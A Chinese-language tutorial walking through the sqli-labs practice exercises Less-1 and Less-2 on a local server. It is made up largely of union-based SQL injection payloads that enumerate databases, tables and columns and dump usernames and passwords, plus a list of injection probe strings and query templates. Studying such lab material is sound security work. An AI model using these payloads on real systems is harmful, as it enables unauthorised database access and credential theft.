这个时候可以用order by求有几列数据（order by实际上是对指定列的数据进行排序），用二分法求出有3列，
就用 http://127.0.0.1/sql/Less-1/?id=1'order by 3–+ ，超过3就会报错：

此时可以用union进行注入，union的作用是在当前一组数据后再加一组数据，且当id的数据在库中不存在时，会直接输出；

注意：用union输入的数据的列数要与本来的数据的列数相同；
输入 http://127.0.0.1/sql/Less-1/?id=1'union select 1,2,3–+

这个时候就可以暴库了，这里是在Your Login name位置输出，也可以把group_concat(schema_name)放在3的位置，在Your Password位置输出：
http://127.0.0.1/sql/Less-1/?id=-1'union select 1,group_concat(schema_name),3 from information_schema.schemata–+

爆出的数据库有：
information_schema,challenges,mysql,performance_schema,security,test

然后选要爆的数据库的数据表，这里是选security数据库，
http://127.0.0.1/sql/Less-1/?id=-1'union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=’security’–+(http://127.0.0.1/sql/Less-1/?id=-1'union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=’security’),3 –+)

爆出的表有：
emails,referers,uagents,users

再选要爆的数据表的数据列，这里选users数据表，
http://127.0.0.1/sql/Less-1/?id=-1'union select 1,group_concat(column_name),3 from information_schema.columns where table_name=’users’–+

爆出的列名：
id,username,password

最后就可以爆数据了，这里我们只要username和password，
http://127.0.0.1/sql/Less-1/?id=-1'union select 1,username,password from users where id=1–+

http://127.0.0.1/sql/Less-1/?id=-1'union select 1,username,password from users where id=2–+

……

也可以用group_concat函数爆数据，
http://127.0.0.1/sql/Less-1/?id=-1'union select 1,group_concat(username),group_concat(password) from users–+

Less-2(整数型注入)

进入http://127.0.0.1/sql/Less-2 ,输入/?id=1，正常输出。
我们尝试用’来注入，发现报错：
You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' LIMIT 0,1' at line 1
我们可以看到报错且id=1’时提交到sql的语句为’LIMIT 0,1，’后面什么也没有，说明是用整数来注入的。
http://127.0.0.1/sql/Less-2/?id=1
可以在后面输入or 1=1–+，正常输出；也可在后面输入and 1=1–+和and1=2–+，前者正常输出，后者既不输出也不报错，说明注入成功。

Less-1~4小结

1.在输入id=1后，可以尝试用'、"、')、")、)、")、"))来判断用什么字符注入（①有报错：也可以用\来判断，只要看报错语句中\后面是什么，而且更方便；②无报错：先输入前面的字符，一般是不能正常输出，再在后面加上–+，如果可以正常输出，说明可以用该字符注入(即存在注入漏洞)）。
2. 常用语句
查库：select schema_name from information_schema.schemata
//从information_schema.schemata查库名（schema_name）
查表：select table_name from information_schema.tables where table_schema=’被查的库的名称’
//从’被查的库的名称’库查表名
//select table_name from information_schema.tables where table_schema=’security’
查列：select column_name from information_schema.columns where table_name=’被查的表的名称’
//从’被查的表的名称’表查列名
//select column_name from information_schema.columns where table_name=’users’
查字段：select 要查的列名1,要查的列名2 from 库名.表名
//分别查列1和列2的字段
//select group_concat(username),group_concat(password) from 库名.表名
查数据：select 要查的列名1,要查的列名2 from 库名.表名 where id=(？)
//从’被查的列的名称’表查id为？的一组数据
//select id,username,password from security.users where id=1

3.一般用于尝试的语句（求注入字符，–+可以用#替换）
1)注释法
or 1=1–+
‘or 1=1–+
“or 1=1–+
)or 1=1–+
‘)or 1=1–+
“) or 1=1–+
“))or 1=1–+
以上正常输出时，说明可以注入；
and 1=1–+
and 1=2–+
以上前者正常输出，后者既不输出也不报错时，说明可以注入。
2)闭合法
*（类似)(或")("）（双重及以上层包裹的会误判为里面一层的字符，如在(‘id’)这种情况时，会存在误判注入字符为’，误判的话接下来的注入就会出错）
4.注入
1)注释法（–+可以用#替换）
* 构造的语句 –+
2)闭合法（*为求出的注入字符或字符的另一半）
* 构造的语句 and/or 1=*1

5.常用函数
group_concat(str1,str2,…)————连接一个组的所有字符串，并以逗号分隔每一条数据。

6.union操作符
用于合并两个或多个 SELECT 语句的结果集。请注意，UNION 内部的 SELECT 语句必须拥有相同数量的列。
列也必须拥有相似的数据类型。同时，每条 SELECT 语句中的 列的顺序必须相同。
